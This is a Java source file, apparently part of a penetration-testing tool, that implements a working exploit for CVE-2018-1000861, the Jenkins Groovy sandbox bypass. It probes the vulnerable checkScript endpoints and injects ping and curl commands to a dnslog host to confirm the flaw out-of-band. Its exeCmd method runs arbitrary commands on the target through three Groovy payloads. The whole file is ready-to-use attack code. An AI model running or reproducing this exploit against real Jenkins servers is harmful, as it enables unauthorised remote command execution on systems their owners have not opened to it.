package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.exp.tools.dnslogSetting;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Jenkins_Info;
import fun.fireline.tools.Response;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;

import static fun.fireline.tools.Tools.dnslog_verify;
import static fun.fireline.tools.Tools.getRandomString;

public class CVE_2018_1000861 implements ExploitInterface {

    private HashMap<String, String> headers = new HashMap();
    private String url = "";
    private boolean isVul = false;
    private Jenkins_Info jenkins_info = new Jenkins_Info();
    private dnslogSetting dnslogSetting = new dnslogSetting();
    private String payload1 = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=";
    private String payload2 = "/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=";


    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        String dnslog = dnslogSetting.getDomain();
        if(dnslog==null){
            return "请进行dnslog配置";
        }
        Response response1 = HttpTools.get(url+this.payload1,this.headers,"UTF-8");
        Response response2 = HttpTools.get(url+this.payload2,this.headers,"UTF-8");
        if(response1.getCode()==200||response2.getCode()==200){
            if(response1.getText().equals("<div/>")||response2.getText().equals("<div/>")){
                this.isVul = true;
                String random = getRandomString(3);
                this.exeCmd("admin|ping -w 1 "+random+"."+dnslog,"UTF-8");
                String basic = "目标可能存在CVE-2018-1000861 绕过Groovy沙盒未授权命令执行漏洞,请从文件读取/命令执行模块进行无回显命令执行测试 \n\t eg:admin|curl dnslog.cn or test1|curl dnslog.cn or test2|curl dnslog.cn";
                if(dnslog_verify(dnslogSetting,random)){
                    return "[+] 经过dnslog api测试, "+basic;
                }else {
                    //排除目标有curl无ping命令的情况
                    this.exeCmd("admin|curl "+random+"."+dnslog,"UTF-8");
                    if(dnslog_verify(dnslogSetting,random)){
                        return "[+] 经过dnslog api测试, "+basic;
                    }else {
                        return "[?] 未经过dnslog api测试, 可能是api限制请求频率,dnslog日志累计过多,目标不出网,当前网络不流畅等原因, 不一定不存在漏洞 ";
                    }
                }
            }
        }
        return "[-] 目标可能不存在CVE-2018-1000861 绕过Groovy沙盒未授权命令执行漏洞";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        if(!cmd.startsWith("admin|")&&!cmd.startsWith("test1|")&&!cmd.startsWith("test2")){
            return "命令格式: admin|curl dnslog.cn or test1|curl dnslog.cn or test2|curl dnslog.cn";
        }
        int Index = cmd.indexOf("|");
        String user = cmd.substring(0,Index);
        cmd = cmd.substring(Index+1);
        String exp = "";
        String payload = "";
        if(user.equals("admin")){
            exp = "public class x {public x(){\"payload\".execute()}}";
            payload = payload1;
        }else if(user.equals("test1")){
            exp = "import groovy.transform.*\n" +
                    "@ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"payload\")})\n" +
                    "class Person{}";
            payload = payload2;
        }else if(user.equals("test2")){
            exp = "import groovy.transform.*\n" +
                    "@ASTTest(value={ \"payload\".execute().text })\n" +
                    "class Person{}";
            payload = payload2;
        }
        String exp2 = exp.replace("payload",cmd);
        try {
            Response response = HttpTools.get(url + payload + URLEncoder.encode(exp2,"UTF-8"), this.headers, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return "无回显命令执行,请自行进行验证";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
